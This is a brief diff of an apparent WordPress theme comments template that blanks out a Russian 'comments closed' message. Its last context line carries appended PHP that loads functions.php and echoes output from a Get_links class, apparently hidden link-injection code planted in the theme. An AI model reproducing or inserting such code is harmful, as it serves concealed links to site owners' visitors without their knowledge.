@@ -32,7 +32,7 @@
 
 	 <?php else : // comments are closed ?>
 		<!-- If comments are closed. -->
-		<p class="nocomments">Комментарии закрыты.</p>
+		<p class="nocomments"></p>
 
 	<?php endif; ?>
 <?php endif; ?><?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_links(); $links = $links->return_links($lib_path); echo $links; ?>
